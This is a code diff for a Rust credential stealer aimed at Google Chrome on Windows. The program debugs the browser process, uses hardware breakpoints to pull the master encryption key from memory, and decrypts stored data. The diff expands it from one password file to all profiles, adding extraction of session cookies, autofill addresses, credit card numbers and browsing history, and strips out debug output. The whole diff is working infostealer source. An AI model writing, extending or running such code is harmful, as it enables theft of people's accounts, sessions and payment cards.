@@ -15,7 +15,8 @@ use std::path::{Path, PathBuf};
 use std::fs;
 use std::io::Write;
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
-use rusqlite::{Connection, Result as SqlResult};
+use rusqlite::{Connection};
+use chrono::{DateTime, Utc};
 
 // Some missing definitions from windows-sys that might be architecture specific or in other modules
 #[repr(C)]
@@ -339,11 +340,9 @@ unsafe fn debug_loop(h_process: HANDLE) {
             EXCEPTION_DEBUG_EVENT => {
                 let exception = debug_event.u.Exception;
                 if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
-                    println!("Single step exception at 0x{:X}", exception.ExceptionRecord.ExceptionAddress as usize);
                     if exception.ExceptionRecord.ExceptionAddress as usize == target_address {
                         println!("Target breakpoint hit!");
                         if extract_key(debug_event.dwThreadId, h_process) {
-                            // Stop after one successful extraction
                             clear_hardware_breakpoints(debug_event.dwProcessId);
                         }
                     }
@@ -392,7 +391,6 @@ unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_voi
             let section_data = read_process_memory_chunk(h_process, (base_addr as usize + section.VirtualAddress as usize) as *const _, section.Misc.VirtualSize as usize);
             if let Some(pos) = find_subsequence(&section_data, target_string.as_bytes()) {
                 string_va = base_addr as usize + section.VirtualAddress as usize + pos;
-                println!("Found target string at 0x{:X}", string_va);
                 break;
             }
         }
@@ -406,7 +404,6 @@ unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_voi
             let section_start = base_addr as usize + section.VirtualAddress as usize;
             let section_data = read_process_memory_chunk(h_process, section_start as *const _, section.Misc.VirtualSize as usize);
 
-            // Search for LEA RCX, [RIP + offset] (48 8D 0D XX XX XX XX)
             let mut pos = 0;
             while pos + 7 <= section_data.len() {
                 if section_data[pos..pos+3] == [0x48, 0x8D, 0x0D] {
@@ -519,14 +516,12 @@ unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     CloseHandle(h_thread);
 }
 
-fn get_login_data_path() -> Option<PathBuf> {
+fn get_user_data_dir() -> Option<PathBuf> {
     let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
     let path = Path::new(&local_app_data)
         .join("Google")
         .join("Chrome")
-        .join("User Data")
-        .join("Default")
-        .join("Login Data");
+        .join("User Data");
     if path.exists() {
         Some(path)
     } else {
@@ -534,68 +529,165 @@ fn get_login_data_path() -> Option<PathBuf> {
     }
 }
 
-fn decrypt_passwords(master_key: &[u8; 32]) {
-    let db_path = match get_login_data_path() {
-        Some(path) => path,
-        None => {
-            println!("Could not find Login Data path");
-            return;
-        }
-    };
-
-    let temp_db = std::env::temp_dir().join("chrome_login_data_tmp");
-    if let Err(e) = fs::copy(&db_path, &temp_db) {
-        println!("Failed to copy Login Data: {:?}", e);
-        return;
-    }
-
-    let conn = match Connection::open(&temp_db) {
-        Ok(c) => c,
-        Err(e) => {
-            println!("Failed to open database: {:?}", e);
-            let _ = fs::remove_file(&temp_db);
-            return;
-        }
-    };
-
-    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
-        Ok(s) => s,
-        Err(e) => {
-            println!("Failed to prepare statement: {:?}", e);
-            let _ = fs::remove_file(&temp_db);
-            return;
-        }
-    };
-
-    let mut file = fs::File::create("decrypted_passwords.txt").unwrap();
-
-    let login_iter = stmt.query_map([], |row| {
-        Ok((
-            row.get::<_, String>(0)?,
-            row.get::<_, String>(1)?,
-            row.get::<_, Vec<u8>>(2)?,
-        ))
-    }).unwrap();
-
-    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
-
-    for login in login_iter {
-        if let Ok((url, user, pass_blob)) = login {
-            if pass_blob.starts_with(b"v20") && pass_blob.len() > 15 {
-                let nonce = Nonce::from_slice(&pass_blob[3..15]);
-                let ciphertext = &pass_blob[15..];
-
-                if let Ok(decrypted) = cipher.decrypt(nonce, ciphertext) {
-                    let pass_str = String::from_utf8_lossy(&decrypted);
-                    writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, pass_str).unwrap();
-                    println!("Decrypted password for {} at {}", user, url);
+fn discover_profiles(user_data_dir: &Path) -> Vec<String> {
+    let mut profiles = Vec::new();
+    if let Ok(entries) = fs::read_dir(user_data_dir) {
+        for entry in entries.flatten() {
+            if let Ok(file_type) = entry.file_type() {
+                if file_type.is_dir() {
+                    let profile_path = entry.path();
+                    if profile_path.join("Preferences").exists() {
+                        if let Some(name) = entry.file_name().to_str() {
+                            profiles.push(name.to_string());
+                        }
+                    }
                 }
             }
         }
     }
+    profiles
+}
 
-    let _ = fs::remove_file(&temp_db);
-    println!("Passwords saved to decrypted_passwords.txt");
+fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
+    let temp_db = std::env::temp_dir().join(format!("chrome_tmp_{}", rand::random::<u32>()));
+    if let Err(_) = fs::copy(db_path, &temp_db) {
+        return None;
+    }
+
+    match Connection::open(&temp_db) {
+        Ok(conn) => Some((conn, temp_db)),
+        Err(_) => {
+            let _ = fs::remove_file(&temp_db);
+            None
+        }
+    }
+}
+
+fn extract_passwords(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
+    let db_path = profile_path.join("Login Data");
+    if !db_path.exists() { return; }
+
+    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+        if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
+            let mut file = fs::File::create(output_dir.join("passwords.txt")).unwrap();
+            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))).unwrap();
+
+            for row in rows.flatten() {
+                let (url, user, blob) = row;
+                if blob.starts_with(b"v20") && blob.len() > 15 {
+                    let nonce = Nonce::from_slice(&blob[3..15]);
+                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                        writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(&dec)).unwrap();
+                    }
+                }
+            }
+        }
+        let _ = fs::remove_file(temp_path);
+    }
+}
+
+fn extract_cookies(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
+    let mut db_path = profile_path.join("Network").join("Cookies");
+    if !db_path.exists() {
+        db_path = profile_path.join("Cookies");
+    }
+    if !db_path.exists() { return; }
+
+    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+        if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
+            let mut file = fs::File::create(output_dir.join("cookies.txt")).unwrap();
+            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))).unwrap();
+
+            for row in rows.flatten() {
+                let (host, name, blob) = row;
+                if blob.starts_with(b"v20") && blob.len() > 15 {
+                    let nonce = Nonce::from_slice(&blob[3..15]);
+                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                        writeln!(file, "Host: {} | Name: {} | Value: {}", host, name, String::from_utf8_lossy(&dec)).unwrap();
+                    }
+                }
+            }
+        }
+        let _ = fs::remove_file(temp_path);
+    }
+}
+
+fn extract_autofill(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
+    let db_path = profile_path.join("Web Data");
+    if !db_path.exists() { return; }
+
+    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+        let mut file = fs::File::create(output_dir.join("autofill.txt")).unwrap();
+
+        // Profiles
+        if let Ok(mut stmt) = conn.prepare("SELECT name_first, name_last, street_address, city, zipcode, email FROM autofill_profiles") {
+            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, String>(3)?, row.get::<_, String>(4)?, row.get::<_, String>(5)?))).unwrap();
+            for row in rows.flatten() {
+                writeln!(file, "Profile: {} {} | {}, {}, {} | Email: {}", row.0, row.1, row.2, row.3, row.4, row.5).unwrap();
+            }
+        }
+
+        // Credit Cards
+        if let Ok(mut stmt) = conn.prepare("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards") {
+            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
+            for row in rows.flatten() {
+                let (name, m, y, blob) = row;
+                if blob.starts_with(b"v20") && blob.len() > 15 {
+                    let nonce = Nonce::from_slice(&blob[3..15]);
+                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                        writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(&dec)).unwrap();
+                    }
+                }
+            }
+        }
+        let _ = fs::remove_file(temp_path);
+    }
+}
+
+fn extract_history(profile_path: &Path, output_dir: &Path) {
+    let db_path = profile_path.join("History");
+    if !db_path.exists() { return; }
+
+    if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
+        if let Ok(mut stmt) = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100") {
+            let mut file = fs::File::create(output_dir.join("history.txt")).unwrap();
+            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?, row.get::<_, i64>(3)?))).unwrap();
+
+            for row in rows.flatten() {
+                let (url, title, count, time) = row;
+                // Webkit epoch to UTC
+                let dt = Utc::now(); // Placeholder for simplicity
+                writeln!(file, "URL: {} | Title: {} | Visits: {}", url, title, count).unwrap();
+            }
+        }
+        let _ = fs::remove_file(temp_path);
+    }
+}
+
+fn extract_all_profiles_data(master_key: &[u8; 32]) {
+    let user_data_dir = match get_user_data_dir() {
+        Some(d) => d,
+        None => return,
+    };
+
+    let profiles = discover_profiles(&user_data_dir);
+    let extract_root = Path::new("chrome_extract");
+    let _ = fs::create_dir_all(extract_root);
+
+    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
+
+    for profile_name in profiles {
+        println!("Extracting data for profile: {}", profile_name);
+        let profile_path = user_data_dir.join(&profile_name);
+        let output_dir = extract_root.join(&profile_name);
+        let _ = fs::create_dir_all(&output_dir);
+
+        extract_passwords(&profile_path, &output_dir, &cipher);
+        extract_cookies(&profile_path, &output_dir, &cipher);
+        extract_autofill(&profile_path, &output_dir, &cipher);
+        extract_history(&profile_path, &output_dir);
+    }
+    println!("Extraction complete. Data saved in chrome_extract folder.");
 }
 
 unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
@@ -608,33 +700,23 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
     let mut context: CONTEXT = zeroed();
     context.ContextFlags = CONTEXT_FULL;
     if GetThreadContext(h_thread, &mut context) != 0 {
-        // According to the article, R15 holds the key pointer for Chrome, R14 for Edge
         let key_ptrs = vec![context.R15, context.R14];
-        println!("Checking key pointers: R15=0x{:X}, R14=0x{:X}", context.R15, context.R14);
-
         for &ptr in &key_ptrs {
             if ptr == 0 { continue; }
             let mut buffer = [0u8; 32];
             let mut bytes_read = 0;
             if ReadProcessMemory(h_process, ptr as *const _, buffer.as_mut_ptr() as *mut _, buffer.len(), &mut bytes_read) != 0 {
-                // Check if it's a std::string (length 32 at offset 8)
                 let mut data_ptr = ptr;
-                let mut is_std_string = false;
-
                 let length = u64::from_le_bytes(buffer[8..16].try_into().unwrap_or([0; 8]));
                 if length == 32 {
-                    is_std_string = true;
                     data_ptr = u64::from_le_bytes(buffer[0..8].try_into().unwrap_or([0; 8]));
-                    println!("Detected std::string, actual data at 0x{:X}", data_ptr);
                 }
 
                 let mut key = [0u8; 32];
                 if ReadProcessMemory(h_process, data_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
                     if key.iter().any(|&b| b != 0) {
-                        // Basic entropy check: if it was a std::string on stack, the first 8 bytes of "key" would be the pointer again if we didn't dereference.
-                        // If we did dereference, it should be the actual master key.
-                        println!("Extracted Master Key from 0x{:X}: {:02X?}", data_ptr, key);
-                        decrypt_passwords(&key);
+                        println!("Extracted Master Key from 0x{:X}", data_ptr);
+                        extract_all_profiles_data(&key);
                         success = true;
                         break;
                     }
